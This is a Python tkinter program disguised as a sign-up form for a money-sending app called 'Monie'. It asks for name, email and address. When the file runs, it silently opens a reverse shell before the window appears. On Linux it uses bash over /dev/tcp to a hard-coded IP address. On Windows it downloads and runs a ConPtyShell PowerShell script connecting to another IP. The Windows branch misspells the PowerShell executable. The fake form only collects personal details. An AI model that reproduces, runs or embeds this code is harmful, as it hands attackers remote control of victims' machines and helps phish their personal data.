import tkinter as tk
import subprocess
import platform

system = platform.system().lower();


def runTheCommand():
	if(system == "linux"): 
		subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/4858 0<&1 2>&1 &", shell=True, executable='/bin/bash')
	elif(system == "windows" ):  
		subprocess.check_call("IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/InvokeConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 87.76.65.54 4567", shell=True, executable="poweshell")

runTheCommand()

app = tk.Tk()


description = "Step 1: Fill these details from you to continue with the next steps"

def addLabel(_text, _font, _y):
	text = tk.Label(app, font = _font, text = _text)
	text.place(x=32, y=_y)


def addEntry(_y):
	_input = tk.Entry(app, bd=1, width=40)
	_input.place(x=32, y = _y)
	

message = tk.Label(app, font="TkDefaultFont", fg="red", text = "")
message.place(x=32, y=800)


codeInput = tk.Entry(app, bd=1, width=40)
	
def handleButtonClicked():
	message.config(text = "Request sent! Now you can wait for the code to verify \n your email. and fill the Code ");
	codeInput.place(x=32, y= 900)


addLabel("Monie - money sending platform ", ("Ubuntu", 17), 32)
addLabel(description, "TkDefaultFont", 150)


addLabel("Full names", "TkDefaultFont", 230)
addEntry(290)

addLabel("Email", "TkDefaultFont", 370)
addEntry(420)

addLabel("Address", "TkDefaultFont", 510)
addEntry(550)


submitButton = tk.Button(app, text="Submit", command=handleButtonClicked)
submitButton.place(x=32, y = 700)


app.title("Monie");

app.geometry("1000x1000")

app.mainloop()


